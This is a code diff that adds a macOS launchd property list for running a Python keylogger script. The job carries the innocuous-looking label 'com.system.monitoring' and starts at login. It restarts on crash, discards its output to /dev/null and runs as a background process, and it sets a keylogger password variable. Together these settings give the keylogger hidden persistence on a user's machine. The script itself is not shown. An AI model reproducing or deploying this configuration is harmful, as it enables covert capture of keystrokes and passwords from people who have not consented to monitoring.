@@ -1,0 +1,71 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>Label</key>
+    <string>com.system.monitoring</string>
+    
+    <key>ProgramArguments</key>
+    <array>
+        <string>/usr/bin/python3</string>
+        <string>/Users/USERNAME/keylogger/keylogger.py</string>
+        <string>--daemon</string>
+    </array>
+    
+    <key>Environment</key>
+    <dict>
+        <key>KEYLOGGER_PASSWORD</key>
+        <string>your_password_here</string>
+        <key>PATH</key>
+        <string>/usr/local/bin:/usr/bin:/bin</string>
+    </dict>
+    
+    <!-- Auto-start settings -->
+    <key>RunAtLoad</key>
+    <true/>
+    
+    <!-- Auto-restart settings -->
+    <key>KeepAlive</key>
+    <dict>
+        <key>SuccessfulExit</key>
+        <false/>
+        <key>Crashed</key>
+        <true/>
+    </dict>
+    
+    <!-- Restart throttling -->
+    <key>ThrottleInterval</key>
+    <integer>60</integer>
+    
+    <!-- Hide output -->
+    <key>StandardOutPath</key>
+    <string>/dev/null</string>
+    
+    <key>StandardErrorPath</key>
+    <string>/dev/null</string>
+    
+    <!-- Background process -->
+    <key>ProcessType</key>
+    <string>Background</string>
+    
+    <key>AbandonProcessGroup</key>
+    <true/>
+    
+    <!-- Low priority -->
+    <key>Nice</key>
+    <integer>1</integer>
+    
+    <!-- Security settings -->
+    <key>HardResourceLimits</key>
+    <dict>
+        <key>NumberOfFiles</key>
+        <integer>1024</integer>
+    </dict>
+    
+    <key>SoftResourceLimits</key>
+    <dict>
+        <key>NumberOfFiles</key>
+        <integer>512</integer>
+    </dict>
+</dict>
+</plist>
